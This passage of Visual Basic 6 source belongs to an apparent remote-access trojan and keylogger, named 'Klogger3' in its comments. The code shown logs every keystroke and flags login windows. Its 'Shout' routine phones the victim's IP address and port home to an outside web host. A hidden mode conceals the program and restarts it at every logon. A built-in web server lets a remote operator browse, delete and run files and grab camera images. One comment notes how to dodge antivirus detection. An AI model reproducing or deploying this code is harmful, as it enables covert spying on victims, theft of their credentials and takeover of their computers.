            ' CHECK(35) is Used in Table Ip Sending Function
            'Get Camera Output EG: 127.0.0.1/CAM,Quality[1-100]
         Case "CAM"
            If Check1(36).Value = 1 Then
                DD1 = GetCameraPicture(Param(1))
                If InStr(1, DD1, "Error") > 0 Then
                    Call SendDhtml(DD1 & "")
                 Else 'NOT LEFT$(DD1,...
                    
                    Dim ImgSrc As String
                    ImgSrc = LocalhttpAddress & "/FDO," & DD1
                    SendD "HTTP/1.1 200 OK" & vbCrLf & "Content-Type: text/html" & vbCrLf & vbCrLf & _
                    "<html><body><img src=""" & ImgSrc & """ id='refresh' name='refresh'>" & vbCrLf & _
      "<SCRIPT language='JavaScript' type='text/javascript'>" & vbCrLf & _
      "var t = 10;" & vbCrLf & _
      "image = " & """" & LocalhttpAddress & "/CAM?1=" & Param(1) & """" & ";" & vbCrLf & _
      "function Start() {" & vbCrLf & _
      "tmp = new Date();" & vbCrLf & _
      "tmp = '?' + tmp.getTime();" & vbCrLf & _
      "document.location.href=image + tmp;" & vbCrLf & _
      "setTimeout('Start()', t*1000);" & vbCrLf & _
      "}" & vbCrLf & _
      "Start();" & vbCrLf & _
      "</SCRIPT></body></html>"
             End If
             
             Else 'NOT CHECK1(36).VALUE...
                SendD "Function 'Camera Capture' Not Enabled"
            End If
            Case "favicon.ico"
            
            Case Else
NOSERVICE:
            If MenuShown = True Then
            SendDhtml GetForm(strStr)
            Exit Sub
            Else
            If mPASS = False Then GoTo NOPASS
            End If
         
         
         End Select

    


    
    
Exit Sub
NOPASS:
    If Param(1) = "" Then
    Call SendDhtml(GetForm("AUTH"))
    Else
    If Param(1) = GetSetting(App.Title, "Setup", "User", Text2.Text) And Param(2) = GetSetting(App.Title, "Setup", "Pass", Text3.Text) Then
    mPASS = True
    GoTo SHOWMENU
    Else
    mPASS = False
    SendDhtml (("Invalid Username or Password!" & "<br>Please Retry Again<br><br>" & GetForm("AUTH")))
    End If
    End If
    
    Exit Sub
    
    
SHOWMENU:
    
    If MenuShown = False Then
    SendD Replace(GetRes("MAINPAGE", 101), "%ip", LocalhttpAddress, , , vbTextCompare)
    MenuShown = True
    End If
    '-----------
    
SUBEND:

' ERR
Exit Sub
Error_Prase:
Call SendDhtml("Error While Executing Function : " & Param(0) & " Values : " & Param(1) & " " & Param(2) & " " & Param(3) & " " & Param(4) & " Err : " & err.number & " " & err.Description)
Log "Error While Executing Function : " & Param(0) & " Values : " & Param(1) & " " & Param(2) & " " & Param(3) & " " & Param(4) & " Error : " & err.Description

End Sub


Sub ControlXpPcMode(HackModen As Boolean)
HackMode = HackModen
End Sub
Sub CloseService()
nSocket.SockClose
End Sub

Private Function ActiveConnection() As Boolean


    ActiveConnection = nSocket.NetConnected

End Function




Private Sub Button1_Mouseup()
lblinfo.Caption = "Only For Registered Users . Hacking Mode is for a different operation mode for no user interaction . just run the hacking mode executable on the machine/server once , then you can remotly access / administrate the computer through remote computer ."
End Sub

Private Sub Button2_Click()
Frame2.Visible = True
Frame2.ZOrder 0
Label16.Caption = "About"
Button3.Visible = True
End Sub

Private Sub Button2_Mouseup()
lblinfo.Caption = "About , How To Buy"

End Sub

Private Sub Button3_Click()
Frame2.Visible = False
Button3.Visible = False
End Sub

Private Sub Button4_Click()
If Len(Text2) < 6 Or Len(Text3) < 6 Then
MsgBox "Username or Password Too Short " & vbCrLf & vbCrLf & "Username and Password must be atleast 6 characters long", vbExclamation, "Setup"
Exit Sub
End If
SaveSetting App.Title, "Setup", "User", Text2.Text
SaveSetting App.Title, "Setup", "Pass", Text3.Text
Label10.Caption = "User : " & Text2.Text
Frame1.Visible = False

End Sub

Private Sub Button5_Click()
Shell "explorer Http://members.lycos.co.uk/uptomoon/controlpcxp.php", vbNormalFocus

End Sub

Private Sub Check1_Click(Index As Integer)


    With Check1(Index)
        If .Value = 1 Then
            .Tag = .Backcolor
            '.BackColor = vbWhite
            .Refresh
         Else 'NOT .VALUE...
            .Backcolor = .Tag 'UserControl.BackColor
        End If
    End With 'Check1(Index)
    'Main Control -------------------------------------------------------------------------
    'Klogger3
    'Keylogger With Great Functionality .
    'It is An Advance Keylogger With Hacking Facility That
    'Everyone Likes To Have
    '
    'You Can Do Everything To your Hacked Computer
    'Even You Can Run An Antivirus or Firewall Over The Hacked Computer :)
    '
    'This Only Needs 2 Files . 1 is Commonly Found in Every System ie : wsock32.dll and Second
    ' is The Runtimes msvbvm60.dll .
    Command2.Caption = "Select Preffered"
    Command1.Caption = "Select All"

End Sub



Private Sub Command1_Click()

  
  Dim i As Long

    If Command1.Caption = "Select All" Then
        Command2.Caption = "Select Preffered"
        For i = 0 To 36
            Check1(i).Value = 1
        Next i
        Command1.Caption = "Unselect All"
     Else 'NOT COMMAND1.CAPTION...
        For i = 0 To 36
            Check1(i).Value = 0
        Next i
        Command1.Caption = "Select All"
    End If

End Sub

Private Sub Command2_Click()

  
  Dim i As Long

    If Command2.Caption = "Select Preffered" Then
        Command1.Caption = "Select All"
        For i = 0 To 36
            Check1(i).Value = 1
        Next i
        Check1(1).Value = 0
        Check1(3).Value = 0
        Check1(9).Value = 0
        Check1(10).Value = 0
        Check1(11).Value = 0
        Check1(12).Value = 0
        Check1(13).Value = 0
        Check1(14).Value = 0
        Check1(17).Value = 0
        Check1(19).Value = 0
        Check1(20).Value = 0
        Check1(22).Value = 0
        Check1(23).Value = 0
        Check1(24).Value = 0
        Check1(26).Value = 0
        Check1(30).Value = 0
        Check1(31).Value = 0
        Check1(32).Value = 0
        Check1(36).Value = 0
        Command2.Caption = "Unselect Preffered"
     Else 'NOT COMMAND2.CAPTION...
        For i = 0 To 36
            Check1(i).Value = 0
        Next i
        Command2.Caption = "Select Preffered"
    End If

End Sub


Private Function DeleteDirectory(ByVal DirtoDelete As Variant) As String

  
  Dim FSO As Variant

    'Deletes the Directorys . ' Guys I Havent Any Way Out Using The Filesystem . Filesystem Object Can Cause Catching Due To Some Antivirus Programs Sees The FileSystem Objects
    On Error GoTo DeleteDirectory_Error
    Set FSO = CreateObject("Scripting.FileSystemObject")
    FSO.DeleteFolder DirtoDelete, True
    On Error GoTo 0 ':( Check Error Handling Structure

Exit Function

DeleteDirectory_Error:
    DeleteDirectory = "Error: " & err.number & " in procedure DeleteDirectory of Module hjjw"
Log DeleteDirectory
End Function

Public Property Let EnableServices(ByVal Enable As Boolean)

  
  Dim A1 As Integer

    For A1 = 0 To Check1.Count - 1
        Check1(A1).Value = IIf(Enable, 1, 0)
    Next '  A1

End Property

Public Function GetDirectoryList(ByVal strPath As String, _
                                 Optional Template As String) As String

  
  Dim A1 As Long ':( Move line to top of current Function
Dim nDir As String
    On Error GoTo GetDirectoryList_Error
    ' Function For Directory List
    With UserControl
        .djjx.Path = GetHexVal(Replace(strPath, "/", "\"))
        .djjx.Refresh
        If .djjx.ListCount = 0 Then
            GetDirectoryList = "<center>..</center>"
        End If
        If Template = "" Then
        GetDirectoryList = GetDirectoryList & "<br>" & "<b>" & .djjx.Path & "</b><br>"
        End If
        For A1 = 0 To .djjx.ListCount - 1
        nDir = Replace(Replace(djjx.List(A1), " ", "%20"), "\", "/")
            GetDirectoryList = GetDirectoryList & IIf(Template <> vbNullString, Replace(Template, "%s", nDir, , , vbTextCompare), GetFileFromPath(djjx.List(A1)) & "<BR>")
            If Not Len(djjx.List(A1)) <= 3 Then
                GetDirectoryList = Replace(GetDirectoryList, "%n", Mid$(djjx.List(A1), InStrRev(djjx.List(A1), "\") + 1))
             Else 'NOT NOT...
                GetDirectoryList = Replace(GetDirectoryList, "%n", djjx.List(A1))
            End If
            GetDirectoryList = Replace(GetDirectoryList, "%GetFileList", "<a Href=""" & LocalhttpAddress & "\DS," & nDir & """>Get Size</a>")
        Next A1
    End With 'USERCONTROL
    'On Error GoTo 0 ':( Check Error Handling Structure
If GetDirectoryList = "" Then GetDirectoryList = "NONE"
Exit Function

GetDirectoryList_Error:
    If err.number = 68 Then
        GetDirectoryList = "Unreachable!"
     Else 'NOT ERR.NUMBER...
        GetDirectoryList = "Error: " & err.number & " in procedure GetDirectoryList of Module hjjw"
        Log GetDirectoryList
    End If

End Function

Public Function GetFileList(ByVal strPath As String, _
                            Optional Template As String) As String

  
  Dim FP As String
  Dim A1 As Long
Dim nDir As String
    'Shows Files List
    On Error GoTo GetFileList_Error
    With UserControl
        .djjy.Path = GetHexVal(Replace(strPath, "/", "\"))
        .djjy.Refresh
        FP = .djjy.Path
    End With 'USERCONTROL
    If Right$(FP, 1) = "\" Then
        DoEvents
     Else 'NOT RIGHT$(FP,...
        FP = FP & "\"
    End If
    With UserControl
        If .djjy.ListCount = 0 Then
            GetFileList = "<center>..</center>"
        End If
        If Template = "" Then
        GetFileList = GetFileList & "<br><b>" & .djjy.Path & "</b>"
        End If
        For A1 = 0 To .djjy.ListCount - 1
        nDir = Replace(Replace(.djjy.List(A1), " ", "%20"), "\", "/")
        
            GetFileList = GetFileList & IIf(Template <> vbNullString, Replace(Template, "%s", Replace(FP, "\", "/") & nDir, , , vbTextCompare), .djjy.List(A1))
            GetFileList = Replace(GetFileList, "%n", .djjy.List(A1))
            GetFileList = Replace(GetFileList, "%l", FormatFileSize(FileLen(FP & .djjy.List(A1)), False), , , vbTextCompare)
        Next A1
    End With 'USERCONTROL
    'On Error GoTo 0 ':( Check Error Handling Structure


If GetFileList = "" Then GetFileList = "NONE"
Exit Function

GetFileList_Error:
    If err.number = 68 Then
        GetFileList = "Unreachable!"
     Else 'NOT ERR.NUMBER...
        GetFileList = "Error: " & err.number & " in procedure GetFileList of Module hjjw"
        Log GetFileList
    End If

End Function



Private Sub HiddenMode_Mouseup()
lblinfo.Caption = "Use Hidden Mode For Invisible Operation . Start the Services and then Click Hidden Mode . The Program Will Then Start Automatically on every time you Log on , Providing Continuely Logging and Remote Abilty . NOTE: All Services Will Be Available in this Mode."
End Sub

Private Sub SetupUserName_Mouseup()
lblinfo.Caption = "Set up Username and Password for logging on remote computer"
End Sub

Private Sub StartServices_Click()
    If StartServices.Caption = "Start" Then
 StartServices.Caption = "Stop"
        StartSock
        
     Else 'NOT StartServices.CAPTION...
     
        nSocket.SockClose
        Text1.Text = ""
        StartServices.Caption = "Start"
    End If
    
End Sub

Function GetRes(resname, id) As String
On Error GoTo err
Dim A As String, B() As Byte
B = LoadResData(id, resname)
GetRes = StrConv(B, vbUnicode)
'GetRes = ChangeToStringUni(B)
Exit Function
err:
err.Clear
GetRes = CStr(B)
End Function

Private Sub SetupUserName_Click()

Frame1.Left = 0
Frame1.Top = 0
Frame1.Width = UserControl.Width
Frame1.Height = UserControl.Height
Button4.Left = Frame1.Width - Button4.Width - 200
Button4.Top = Frame1.Height - Button4.Height - 200
Frame1.Visible = True
Frame1.ZOrder 0
Text2.Text = GetSetting(App.Title, "Setup", "User", Text2.Text)
Text3.Text = GetSetting(App.Title, "Setup", "Pass", Text3.Text)
End Sub

Private Sub StartServices_Mouseup()
lblinfo.Caption = "Start/Stop the Services"
End Sub

Private Sub TestButton_Click()
If nSocket.isListening = False Then MsgBox "Please Click ""Start"" First and then Enable Some Services You Want to Test .", vbExclamation, "Test": Exit Sub
ShellExecute 0, "open", Text1.Text, "", "", 1
End Sub

Private Sub HiddenMode_Click()
MsgBox "The Program Will Be Visible By Pressing the hotkey 'Ctrl+Alt+C'", vbInformation, "Hidden Mode"
Hkr.Invisible
End Sub



Private Sub Label5_Click()


    MsgBox " The User Name and Password is Your Server Side Identity . You Will Be Able To Locate Your Computers Ip Address And Control Your Computer Via Any Web Browser in The World .", vbInformation, "Help"

End Sub

Private Sub Label6_Click()


    MsgBox " These Are Services ( Functions ) That You Can Use When Controlling Your Computer From Another Computer . You Can Enable These Services Which You Want To Use .", vbInformation, "Help"

End Sub

Function GetForm(Command As String) As String
Dim Counter As Long
Counter = 1
Dim A1 As String, A2() As String, A3 As Long, A4 As String, a5 As String, a6() As String, A7 As Long
Dim A8() As String, A9 As Long, Hasradio As Boolean

If Command = "AUTH" Then
A1 = GetRes("LOGINPAGE", 103)
GetForm = Replace(A1, "%url", "AUTH")
Exit Function
End If

A1 = GetRes("COMMANDS", 102)
A2 = Split(A1, vbCrLf)
For A3 = 0 To UBound(A2)
If UBound(Split(A2(A3), ",")) >= 2 Then
A4 = Split(A2(A3), ",")(1)
If LCase(Command) = LCase(A4) Then
GetForm = "<b>" & Split(A2(A3), ",")(0) & "</b><br>" & "<form methord=""get"" action=""" & LocalhttpAddress & "/" & A4 & """>"
a5 = Replace(A2(A3), Split(A2(A3), ",")(0) & "," & Split(A2(A3), ",")(1) & "," & Split(A2(A3), ",")(2) & ",", "", , , vbTextCompare)
a6 = Split(a5, ",")
For A7 = 0 To UBound(a6)
If UBound(Split(a6(A7), ":")) > 1 Then
'Multiple Options
A8 = Split(a6(A7), ":")
GetForm = GetForm & "<b>" & A8(0) & " : </b><br>"
For A9 = 1 To UBound(A8)
If InStr(A8(A9), "|") > 0 Then
' Param has label
GetForm = GetForm & Split(A8(A9), "|")(0) & " : " & "<input type=""radio"" value=""" & Split(A8(A9), "|")(1) & """ name=""" & Counter & """><br>" & vbCrLf
Hasradio = True
Else
'Param Has No Lable
GetForm = GetForm & A8(A9) & " : " & "<input type=""radio"" value=""" & A8(A9) & """ name=""" & Counter & """><br>" & vbCrLf
Hasradio = True

End If

Next
If Hasradio = True Then Counter = Counter + 1
ElseIf UBound(Split(a6(A7), ":")) = 1 Then
'Nesessary Field
GetForm = GetForm & a6(A7) & " : " & "<input type=""" & IIf(LCase(a6(A7)) = "password", "password", "text") & """ name=""" & Counter & """ size=""20""><br>" & vbCrLf
Counter = Counter + 1
Else

'Normal Field
GetForm = GetForm & a6(A7) & " : " & "<input type=""" & IIf(LCase(a6(A7)) = "password", "password", "text") & """ name=""" & Counter & """ size=""20""><br>" & vbCrLf
Counter = Counter + 1
End If
Next


DoEvents
End If
End If
Next
If GetForm <> "" Then
GetForm = GetForm & "<input type=""submit"" value=""Submit"" ></form>"
Else
SendDhtml "No Parameters Selected or Invalid Command!"
End If
End Function

Private Sub nSocket_Closed()
'mPASS = False
'MenuShown = False
End Sub

Private Sub nsocket_ConnectionRequest()

  'Set Timeout Duration

    Timein = False
    tjjx.Interval = 20000
    tjjx.Enabled = True
    Debug.Print tjjx.Enabled
    'Set The Global Variable ( our IP and Port )
    LocalhttpAddress = Text1.Text
    'SendD "OK"
'MenuShown = True
End Sub

Private Sub nsocket_DataArrival(ByVal Data As String)


    inData = Data
    'Data Recieving
    DataIN = True
    
    'if We'r listening Then Manupulate Data
    
    
    'Debug.Print Data & vbCrLf & vbCrLf
    Manupulation Data
   
End Sub

Private Sub nsocket_Error(ByVal number As Long, Description As String)


    If IdeCheck = False Then
        Exit Sub
    End If
    On Error GoTo Error_Prase
    'Close The Sock
    nSocket.ConnectionClose
    'If We'r Recieving Error
    If number = 4 Then
        ' Turn To Next Port For Next Listening
        port = port + 1
        'If There'Template Too Many Errors Then Message The user ( it may Due To Ras Not installed )
        If port > 32005 Then
            nSocket.SockClose
            MsgBox "ERROR : Cannot Listen For Connections or MAYBE RAS NOT INSTALLED!" & vbCrLf & vbCrLf & " Try Connecting To Internet Before Running The Program.", vbCritical, "Error Starting Connection"
            Exit Sub
        End If
Error_Prase:
        'Restart Sock
        nSocket.port = port
        nSocket.SockClose
        StartSock
    End If

End Sub


Public Sub SendD(ByVal strText As String)
  'Dim A1 As Long
    On Error GoTo Error_Prase
    'Send Data
    nSocket.SendDataTo strText
    nSocket.ConnectionClose
    'spjw.ListenTo
    tjjx.Enabled = False
    tjjx.Interval = 10000
    Exit Sub
Error_Prase:
    err.Clear
End Sub

Public Sub SendDhtml(ByVal strText As String)
  'Dim A1 As Long
    On Error GoTo Error_Prase
    Dim Style As String
    'Send Data
    Style = "<html><head>" & _
"<meta http-equiv='Content-Language' content='en-us'>" & _
"<meta http-equiv='Content-Type' content='text/html; charset=windows-1252'>" & _
"<title>New Page 1</title>" & _
"<style>" & _
"<!--" & _
"table        {font-family: Tahoma; font-size: 8pt; color: #000000; border: 1px dashed #C0C0C0; background-color: #E4E4E4; text-align: left; text-indent: 1; word-spacing: 1; line-height: 100%; margin-left: 2; margin-right: 2; margin-top: 2; margin-bottom:2 }" & _
"body         {font-family: Tahoma; font-size: 8pt; color: #000080; text-align: left; text-indent: 1; word-spacing: 1; line-height: 100%; margin-left: 2; margin-right: 2; margin-top: 2; margin-bottom:2 }" & _
"input        { font-family: Tahoma; font-size: 8pt; word-spacing: 0; text-indent: 1; line-height: 100%; font-weight: bold; border-style: outset; border-width: 1px; margin-left:2; margin-right: 2; margin-top: 2; margin-bottom: 2; background-color: #E7E9E3 }" & _
"button       { border-style: outset; border-width: 1px }" & _
"-->" & _
"</style>" & _
"</head>" & _
"<body>"

    strText = Style & strText
    'If InStr(1, strText, "<html>", vbTextCompare) <= 0 Then strText = "<html>" & strText & "</html>"
    nSocket.SendDataTo strText
    nSocket.ConnectionClose
    'spjw.ListenTo
    tjjx.Enabled = False
    tjjx.Interval = 10000
    Exit Sub
Error_Prase:
    err.Clear
End Sub

Public Function SFM(strPath As String) As String

  
  Dim Template As String

    On Error GoTo SFM_Error
    If LenB(strPath) = 0 Then
        SFM = GetDriveLetters("<a Href = ""SFM,%s"" >%s</a>")
     Else 'NOT LENB(STRPATH)...
        SFM = "Contents of : " & strPath
        SFM = SFM & "<h4>Directorys:</h4><table>"
        Template = "<tr>" & "<td ><a href=""" & LocalhttpAddress & "/" & "SFM,%s"">%n</a>" & "</td>" & "<td nwidth=""13%"" height=""1"">%GetFileList" & "</td>" & "<td nwidth=""14%"" height=""1"">" & "<a Href=""" & LocalhttpAddress & "/" & "DD,%s"">Kill Directory</a>" & "</td>" & "</tr>"
        SFM = SFM & GetDirectoryList(strPath, Template)
        SFM = SFM & "</table>"
        SFM = SFM & "<h4>Files:</h4><table  > "
        Template = "<tr>" & "<td  >" & "<a Href=""" & LocalhttpAddress & "/" & "FDO,%s"" >%n</a>" & "</td>" & "<td nwidth=""13%"" height=""1"">" & "%l" & "</td>" & "<td nwidth=""14%"" height=""1"">" & "<a Href= """ & LocalhttpAddress & "/" & "FD,%s"" >Kill File</a>" & "</td>" & "<td nwidth=""14%"" height=""1"">" & "<a Href= """ & LocalhttpAddress & "/" & "FIRE,open,%s,,,1"" >Run</a>" & "</td>" & "</tr>"
        SFM = SFM & GetFileList(strPath, Template) & "</table>"
        
    End If
    SFM = Replace(SFM, vbCrLf, "<br>")
    'On Error GoTo 0 ':( Check Error Handling Structure

Exit Function

SFM_Error:
    SFM = "Error: " & err.number & " in procedure SFM of Module hjjw"

End Function

Public Sub Shout()

  
  Dim DD As String

    'Send Ip Address & Log ----------------------------------------------------------------------------------
    On Error GoTo Error_Prase
    With nSocket
        .SockClose
        Randomize: .LocalPort = Int(Rnd(31000) * 31000)
        'This is the Server Where Our Information Page Hosted
        .ConnectTo 80, "members.lycos.co.uk"
    End With 'nSocket
    tjjx.Interval = 10000
    tjjx.Enabled = True
    Wait 1
    If nSocket.Connected Then
        DataIN = False
        ' This is Encrypted Url Address Where The Program Sends The Computer Information .
        ' The Url Contains The Output File Name To Be Created and The Computer Information . Which is Positioned as %s
        ' The Url is Encrypted With Table Simple Algorithem . The Encrypter,Decrypter Program is Supplied Where You Downloaded The Code
        'Members.lycos.co.uk/uptomoon/controlpcxp.php
        DD = "POST /uptomoon/u.php?i=%3 HTTP/1.1" & vbCrLf & _
                "Accept: application/x-shockwave-flash, image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, */*" & vbCrLf & _
                "Accept -Language: En -us" & vbCrLf & _
                "User-Agent: Mozilla/4.0" & vbCrLf & _
                "Host: %h" & vbCrLf & _
                "Connection: Keep -Alive" & vbCrLf
        ' Here You Can Add More Things To Know About The Computer Before You Open it
        ' This is The Information Uploading Section
        ' We Are Now Just Uploading The Ip Address,Port,Date Time
        ' Because The Url Cannot Contain Spaces . So The Spaces Are Changed To "|" Sign
        'DD = Replace(DD, "%1", Text2.Text)
        'DD = Replace(DD, "%2", Text3.Text)
        DD = Replace(DD, "%3", Text1.Text)
        'DD = Replace(DD, "%4", App.Major & "." & App.Minor & "." & App.Revision)
        nSocket.SendDataTo DD & vbCrLf
        tjjx.Interval = 20000
        tjjx.Enabled = True
        'Debug.Print DD ':( Temporary Debugging Code
        Wait 2
        If DataIN = True Then Debug.Print "Shouted" Else Debug.Print "No Shout"
        'Debug.Print vbCrLf & vbCrLf & "----Data Sent----"
        'Debug.Print "Send OK" ':( Temporary Debugging Code
    End If
    tjjx.Interval = 60000
    tjjx.Enabled = False
    StartSock
    
    Exit Sub
    
Error_Prase:
Debug.Print "Shout Error "
    If err.number > 0 Then
        ManageLog True, 0, 0, Date, Time, "Errors", "Errors", "Errors", "Error -> Number : " & err.number & " Description : " & err.Description & " Module : Services" & " Sub : Shout"
        Log "Shout Error : " & err.Description
    End If
    err.Clear
    tjjx.Interval = 60000
    tjjx.Enabled = False
    StartSock

End Sub

Public Sub Show(ByVal Template As Boolean)


    IdeCheck = Template
    'Main Control -------------------------------------------------------------------------
    nSocket.Show Template

End Sub

Public Property Get Start() As Boolean


    Start = nSocket.isListening

End Property

Public Property Let Start(ByVal blnVal As Boolean)


    If blnVal Then
        StartServices.Caption = "Stop"
        Randomize
        port = 2100 'IIf((Rnd(32000) * 32000) = 0, 254, (Rnd(32000) * 32000))
        
        tjjw.Enabled = True
        tjjy.Enabled = True
        LogEnabled = CBool(GetSetting("General", "Settings", "LE", "True"))
        StartSock
     Else 'BLNVAL = FALSE/0
        StartServices.Caption = "Start"
        nSocket.SockClose
        tjjw.Enabled = False
        tjjy.Enabled = False
        Text1.Text = ""
    End If

End Property

Public Sub StartSock()
UserControl.Enabled = False
frm_wait.Visible = True
frm_wait.ZOrder 0

  'Set listening Parameters
If port <= 0 Then MsgBox "Error in Program , Please Update Your Software from the update button on top .": Exit Sub

    Debug.Print "Listening : " & port
    With nSocket
        'Randomize: .LocalPort = Int(Rnd(32000) * 32000)
        .LocalPort = Int(Rnd(32000) * 32000)
        .port = port
        .ListenTo
    End With 'nsocket
    
Text1.Text = "Http://" & nSocket.LocalIP & ":" & port

frm_wait.Visible = False
UserControl.Enabled = True
End Sub




Private Sub TestButton_Mouseup()
lblinfo.Caption = "Test the services on your own computer."
End Sub

Private Sub tjjw_Timer()
tjjw.Enabled = UserControl.Ambient.UserMode
  
  Dim nChar As Long
  Dim nText As String
  Dim L1    As String
  Dim T1    As String
  Dim L2    As String
  Dim nKey  As Long
 
 If HackMode = False Then
 If Not Getasynckeystate(17) = 0 And Not Getasynckeystate(18) = 0 And Not Getasynckeystate(67) = 0 Then
 Hkr.Visiblen
 End If
 End If
    If LogEnabled = False Then
       
        tjjw.Interval = 6000
     Else 'NOT LOGENABLED...
        If Not tjjw.Interval = 10 Then
            tjjw.Interval = 10
        End If
    End If
    'This Timer Records KeyStrokes
    For nChar = 1 To 255
        If Not Getasynckeystate(161) = 0 Or Not Getasynckeystate(160) = 0 Then
            Shift1 = True
        End If
        nKey = Getasynckeystate(nChar)
        If nKey = -32767 Then
            If nChar = 189 Then
                If Shift1 = False Then
                    nText = "-"
                 Else 'NOT SHIFT1...
                    nText = "_"
                End If
             ElseIf nChar = 187 Then 'NOT NCHAR...
                If Shift1 = False Then
                    nText = "="
                 Else 'NOT SHIFT1...
                    nText = "+"
                End If
             ElseIf nChar = 220 Then 'NOT NCHAR...
                If Shift1 = False Then
                    nText = "\"
                 Else 'NOT SHIFT1...
                    nText = "|"
                End If
             ElseIf nChar = 192 Then 'NOT NCHAR...
                If Shift1 = False Then
                    nText = "`"
                 Else 'NOT SHIFT1...
                    nText = "~"
                End If
             ElseIf nChar = 219 Then 'NOT NCHAR...
                If Shift1 = False Then
                    nText = "["
                 Else 'NOT SHIFT1...
                    nText = "{"
                End If
             ElseIf nChar = 221 Then 'NOT NCHAR...
                If Shift1 = False Then
                    nText = "]"
                 Else 'NOT SHIFT1...
                    nText = "}"
                End If
             ElseIf nChar = 186 Then 'NOT NCHAR...
                If Shift1 = False Then
                    nText = ";"
                 Else 'NOT SHIFT1...
                    nText = ":"
                End If
             ElseIf nChar = 222 Then 'NOT NCHAR...
                If Shift1 = False Then
                    nText = "'"
                 Else 'NOT SHIFT1...
                    nText = Chr$(34)
                End If
             ElseIf nChar = 188 Then 'NOT NCHAR...
                If Shift1 = False Then
                    nText = ","
                 Else 'NOT SHIFT1...
                    nText = "<"
                End If
             ElseIf nChar = 190 Then 'NOT NCHAR...
                If Shift1 = False Then
                    nText = "."
                 Else 'NOT SHIFT1...
                    nText = ">"
                End If
             ElseIf nChar = 191 Then 'NOT NCHAR...
                If Shift1 = False Then
                    nText = "/"
                 Else 'NOT SHIFT1...
                    nText = "..."
                End If
             ElseIf nChar >= 48 And nChar <= 57 Then 'NOT NCHAR...
                If Shift1 Then  ':( Remove Pleonasm
                    Select Case (nChar - 48)
                     Case 0
                        nText = ")"
                     Case 1
                        nText = "!"
                     Case 2
                        nText = "@"
                     Case 3
                        nText = "#"
                     Case 4
                        nText = "$"
                     Case 5
                        nText = "%"
                     Case 6
                        nText = "^"
                     Case 7
                        nText = "&"
                     Case 8
                        nText = "*"
                     Case 9
                        nText = "("
                    End Select
                 Else 'NOT SHIFT1...'SHIFT1 = FALSE/0
                    nText = Chr$(nChar)
                End If
             ElseIf nChar = VK_BACK Then 'NOT NCHAR...
                nText = " {B.S} "
             ElseIf nChar = VK_CONTROL Then 'NOT NCHAR...
                nText = " {CTRL} "
                'ElseIf nChar = VK_Shift1 Then
                'nText = " {SHIFT} "
                'Shift1 = True
             ElseIf nChar = VK_TAB Then 'NOT NCHAR...
                nText = " {TAB} "
             ElseIf nChar = VK_RETURN Then 'NOT NCHAR...
                nText = " {ENTER} "
             ElseIf nChar = VK_MENU Then 'NOT NCHAR...
                nText = " {ALT} "
             ElseIf nChar = VK_ESCAPE Then 'NOT NCHAR...
                nText = " {ESC} "
             ElseIf nChar = VK_CAPITAL Then 'NOT NCHAR...
                nText = " {CAPS} "
             ElseIf nChar = VK_SPACE Then 'NOT NCHAR...
                nText = " "
             ElseIf nChar = VK_UP Then 'NOT NCHAR...
                nText = " {UP} "
             ElseIf nChar = VK_LEFT Then 'NOT NCHAR...
                nText = " {LEFT} "
             ElseIf nChar = VK_RIGHT Then 'NOT NCHAR...
                nText = " {RIGHT} "
             ElseIf nChar = VK_DOWN Then 'NOT NCHAR...
                nText = " {DOWN} "
             ElseIf nChar = VK_F1 Then 'NOT NCHAR...
                nText = " {F1} "
             ElseIf nChar = VK_F2 Then 'NOT NCHAR...
                nText = " {F2} "
             ElseIf nChar = VK_F3 Then 'NOT NCHAR...
                nText = " {F3} "
             ElseIf nChar = VK_F4 Then 'NOT NCHAR...
                nText = " {F4} "
             ElseIf nChar = VK_F5 Then 'NOT NCHAR...
                nText = " {F5} "
             ElseIf nChar = VK_F6 Then 'NOT NCHAR...
                nText = " {F6} "
             ElseIf nChar = VK_F7 Then 'NOT NCHAR...
                nText = " {F7} "
             ElseIf nChar = VK_F8 Then 'NOT NCHAR...
                nText = " {F8} "
             ElseIf nChar = VK_F9 Then 'NOT NCHAR...
                nText = "{F9}"
             ElseIf nChar = VK_F10 Then 'NOT NCHAR...
                nText = " {F10} "
             ElseIf nChar = VK_F11 Then 'NOT NCHAR...
                nText = " {F11} "
             ElseIf nChar = VK_F12 Then 'NOT NCHAR...
                nText = " {F12} "
             ElseIf nChar = VK_SNAPSHOT Then 'NOT NCHAR...
                nText = " {PRINT SCRN} "
             ElseIf nChar = VK_PERIOD Then 'NOT NCHAR...
                nText = "."
             ElseIf nChar = VK_COMMA Then 'NOT NCHAR...
                nText = ","
             ElseIf nChar = VK_NUMLOCK Then 'NOT NCHAR...
                nText = " {NUMLCK} "
             ElseIf nChar = VK_NUMPAD0 Then 'NOT NCHAR...
                nText = "0"
             ElseIf nChar = VK_NUMPAD1 Then 'NOT NCHAR...
                nText = "1"
             ElseIf nChar = VK_NUMPAD2 Then 'NOT NCHAR...
                nText = "2"
             ElseIf nChar = VK_NUMPAD3 Then 'NOT NCHAR...
                nText = "3"
             ElseIf nChar = VK_NUMPAD4 Then 'NOT NCHAR...
                nText = "4"
             ElseIf nChar = VK_NUMPAD5 Then 'NOT NCHAR...
                nText = "5"
             ElseIf nChar = VK_NUMPAD6 Then 'NOT NCHAR...
                nText = "6"
             ElseIf nChar = VK_NUMPAD7 Then 'NOT NCHAR...
                nText = "7"
             ElseIf nChar = VK_NUMPAD8 Then 'NOT NCHAR...
                nText = "8"
             ElseIf nChar = VK_NUMPAD9 Then 'NOT NCHAR...
                nText = "9"
             ElseIf nChar >= 65 And nChar <= 90 Then 'NOT NCHAR...
                nText = (Chr$(nChar))
                If Shift1 Then  ':( Remove Pleonasm
                    nText = UCase$(nText)
                 Else 'NOT SHIFT1...'SHIFT1 = FALSE/0
                    nText = LCase$(nText)
                End If
             ElseIf nChar >= 97 And nChar <= 122 Then 'NOT NCHAR...
                nText = Chr$(nChar)
                If Shift1 Then  ':( Remove Pleonasm
                    nText = UCase$(nText)
                 Else 'NOT SHIFT1...'SHIFT1 = FALSE/0
                    nText = LCase$(nText)
                End If
            End If
            LoggedKeys = LoggedKeys & nText
            DoEvents
        End If
    Next nChar
    Shift1 = False
    'If The Window is Changed then Save Previous Window Name And Keys
    If GetActiveWindow(0) = "1" Then
        'If Window Name is Readable Then
        T1 = GetActiveWindow(3)
        L1 = GetActiveWindow(4)
        If T1 <> "" Then
            'Get Login Forms
            If InStr(1, T1, "Login", vbTextCompare) > 0 Or InStr(1, T1, "Log in", vbTextCompare) > 0 Or InStr(1, T1, "Signin", vbTextCompare) > 0 Or InStr(1, T1, "Sign in", vbTextCompare) > 0 Then
                L2 = "Login"
            End If
